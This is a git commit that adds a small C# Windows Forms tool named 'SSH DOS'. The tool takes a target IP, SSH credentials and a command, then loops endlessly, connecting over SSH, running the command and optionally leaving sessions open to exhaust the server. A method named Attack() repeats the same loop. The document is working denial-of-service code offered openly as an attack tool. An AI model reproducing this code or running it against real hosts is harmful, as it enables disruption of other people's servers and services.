ae6d1a8edaa1a54aa356fcc4119191ef89fc1dd4
Brendan McShane <brendanmcs7@gmail.com>
2018-07-17 00:34:01 -0400

    Created

---
+++ SSLdos/Form1.Designer.cs
@@ -0,0 +1,203 @@
+﻿namespace SSLdos
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.textBox1 = new System.Windows.Forms.TextBox();
+            this.textBox2 = new System.Windows.Forms.TextBox();
+            this.label1 = new System.Windows.Forms.Label();
+            this.label2 = new System.Windows.Forms.Label();
+            this.textBox3 = new System.Windows.Forms.TextBox();
+            this.textBox4 = new System.Windows.Forms.TextBox();
+            this.label3 = new System.Windows.Forms.Label();
+            this.label4 = new System.Windows.Forms.Label();
+            this.goButton = new System.Windows.Forms.Button();
+            this.Screen = new System.Windows.Forms.CheckBox();
+            this.Disconnect = new System.Windows.Forms.CheckBox();
+            this.stopButton = new System.Windows.Forms.Button();
+            this.SuspendLayout();
+            // 
+            // textBox1
+            // 
+            this.textBox1.Location = new System.Drawing.Point(3, 23);
+            this.textBox1.Name = "textBox1";
+            this.textBox1.Size = new System.Drawing.Size(173, 20);
+            this.textBox1.TabIndex = 0;
+            this.textBox1.TextChanged += new System.EventHandler(this.textBox1_TextChanged);
+            // 
+            // textBox2
+            // 
+            this.textBox2.Location = new System.Drawing.Point(3, 65);
+            this.textBox2.Name = "textBox2";
+            this.textBox2.Size = new System.Drawing.Size(173, 20);
+            this.textBox2.TabIndex = 1;
+            this.textBox2.Text = "Root";
+            this.textBox2.TextChanged += new System.EventHandler(this.textBox2_TextChanged);
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Location = new System.Drawing.Point(3, 4);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(61, 13);
+            this.label1.TabIndex = 2;
+            this.label1.Text = "IP Address:";
+            this.label1.Click += new System.EventHandler(this.label1_Click);
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Location = new System.Drawing.Point(3, 46);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(58, 13);
+            this.label2.TabIndex = 3;
+            this.label2.Text = "Username:";
+            this.label2.Click += new System.EventHandler(this.label2_Click);
+            // 
+            // textBox3
+            // 
+            this.textBox3.Location = new System.Drawing.Point(3, 107);
+            this.textBox3.Name = "textBox3";
+            this.textBox3.Size = new System.Drawing.Size(173, 20);
+            this.textBox3.TabIndex = 4;
+            this.textBox3.TextChanged += new System.EventHandler(this.textBox3_TextChanged);
+            // 
+            // textBox4
+            // 
+            this.textBox4.Location = new System.Drawing.Point(3, 150);
+            this.textBox4.Name = "textBox4";
+            this.textBox4.Size = new System.Drawing.Size(173, 20);
+            this.textBox4.TabIndex = 5;
+            this.textBox4.TextChanged += new System.EventHandler(this.textBox4_TextChanged);
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.Location = new System.Drawing.Point(3, 88);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(56, 13);
+            this.label3.TabIndex = 6;
+            this.label3.Text = "Password:";
+            this.label3.Click += new System.EventHandler(this.label3_Click);
+            // 
+            // label4
+            // 
+            this.label4.AutoSize = true;
+            this.label4.Location = new System.Drawing.Point(3, 131);
+            this.label4.Name = "label4";
+            this.label4.Size = new System.Drawing.Size(57, 13);
+            this.label4.TabIndex = 7;
+            this.label4.Text = "Command:";
+            this.label4.Click += new System.EventHandler(this.label4_Click);
+            // 
+            // goButton
+            // 
+            this.goButton.Location = new System.Drawing.Point(3, 199);
+            this.goButton.Name = "goButton";
+            this.goButton.RightToLeft = System.Windows.Forms.RightToLeft.No;
+            this.goButton.Size = new System.Drawing.Size(173, 84);
+            this.goButton.TabIndex = 8;
+            this.goButton.Text = "Activate";
+            this.goButton.UseVisualStyleBackColor = true;
+            this.goButton.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // Screen
+            // 
+            this.Screen.AutoSize = true;
+            this.Screen.Location = new System.Drawing.Point(3, 176);
+            this.Screen.Name = "Screen";
+            this.Screen.Size = new System.Drawing.Size(82, 17);
+            this.Screen.TabIndex = 9;
+            this.Screen.Text = "Use Screen";
+            this.Screen.UseVisualStyleBackColor = true;
+            this.Screen.CheckedChanged += new System.EventHandler(this.checkBox1_CheckedChanged);
+            // 
+            // Disconnect
+            // 
+            this.Disconnect.AutoSize = true;
+            this.Disconnect.Location = new System.Drawing.Point(91, 176);
+            this.Disconnect.Name = "Disconnect";
+            this.Disconnect.Size = new System.Drawing.Size(97, 17);
+            this.Disconnect.TabIndex = 11;
+            this.Disconnect.Text = "No Disconnect";
+            this.Disconnect.UseMnemonic = false;
+            this.Disconnect.UseVisualStyleBackColor = true;
+            // 
+            // stopButton
+            // 
+            this.stopButton.Location = new System.Drawing.Point(3, 289);
+            this.stopButton.Name = "stopButton";
+            this.stopButton.Size = new System.Drawing.Size(173, 83);
+            this.stopButton.TabIndex = 12;
+            this.stopButton.Text = "Stop";
+            this.stopButton.UseVisualStyleBackColor = true;
+            this.stopButton.Click += new System.EventHandler(this.stopButton_Click);
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(190, 376);
+            this.Controls.Add(this.stopButton);
+            this.Controls.Add(this.Disconnect);
+            this.Controls.Add(this.Screen);
+            this.Controls.Add(this.goButton);
+            this.Controls.Add(this.label4);
+            this.Controls.Add(this.label3);
+            this.Controls.Add(this.textBox4);
+            this.Controls.Add(this.textBox3);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.label1);
+            this.Controls.Add(this.textBox2);
+            this.Controls.Add(this.textBox1);
+            this.MinimumSize = new System.Drawing.Size(206, 415);
+            this.Name = "Form1";
+            this.Text = "SSH DOS";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.TextBox textBox1;
+        private System.Windows.Forms.TextBox textBox2;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.TextBox textBox3;
+        private System.Windows.Forms.TextBox textBox4;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.Label label4;
+        private System.Windows.Forms.Button goButton;
+        private System.Windows.Forms.CheckBox Screen;
+        private System.Windows.Forms.CheckBox Disconnect;
+        private System.Windows.Forms.Button stopButton;
+    }
+}
+
---
+++ SSLdos/Form1.cs
@@ -0,0 +1,167 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Threading;
+using System.Windows.Forms;
+using Renci.SshNet;
+
+namespace SSLdos
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+            stopButton.Enabled = false;
+        }
+
+        private BackgroundWorker _worker = null;
+
+        private void label1_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void label5_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void textBox2_TextChanged(object sender, EventArgs e)
+        {
+
+        }
+
+        private void label2_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+
+        }
+
+        private void textBox1_TextChanged(object sender, EventArgs e)
+        {
+
+        }
+
+        private void textBox3_TextChanged(object sender, EventArgs e)
+        {
+
+        }
+
+        private void label3_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void label4_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void textBox4_TextChanged(object sender, EventArgs e)
+        {
+
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            _worker = new BackgroundWorker();
+            _worker.WorkerSupportsCancellation = true;
+
+            _worker.DoWork += new DoWorkEventHandler((state, args) =>
+            {
+                do
+                {
+                    if (_worker.CancellationPending)
+                    {
+                        break;
+                    }
+
+                    using (SshClient client = new SshClient(textBox1.Text, textBox2.Text, textBox3.Text))
+                    {
+     
+                        
+                        try
+                        {
+                            client.Connect();
+                            if (Screen.Checked)
+                            {
+                                client.RunCommand("screen");
+                            }
+                            client.RunCommand(textBox4.Text);
+                            if (!Disconnect.Checked)
+                            {
+                                client.Disconnect();
+                            }
+                        }
+                        catch
+                        {
+                            MessageBox.Show("Error Connecting SSH", "SSH Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                            break;
+                        }
+                        
+                    }
+
+                } while (true);
+            });
+
+            _worker.RunWorkerAsync();
+            goButton.Enabled = false;
+            stopButton.Enabled = true;
+        }
+
+        private void checkBox1_CheckedChanged(object sender, EventArgs e)
+        {
+
+        }
+        public void Attack()
+        {
+
+
+            //do work
+            using (SshClient client = new SshClient(textBox1.Text, textBox2.Text, textBox3.Text))
+            {
+                while (true)
+                {
+                    try
+                    {
+                        client.Connect();
+                        if (Screen.Checked)
+                        {
+                            client.RunCommand("screen");
+                        }
+                        client.RunCommand(textBox4.Text);
+                        if (!Disconnect.Checked)
+                        {
+                            client.Disconnect();
+                        }
+                    }
+                    catch
+                    {
+                        MessageBox.Show("Error Connecting SSH", "SSH Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                        break;
+                    }
+                }
+            }
+
+        }
+
+        private void stopButton_Click(object sender, EventArgs e)
+        {
+            stopButton.Enabled = false;
+            goButton.Enabled = true;
+            _worker.CancelAsync();
+        }
+    }
+
+}
+
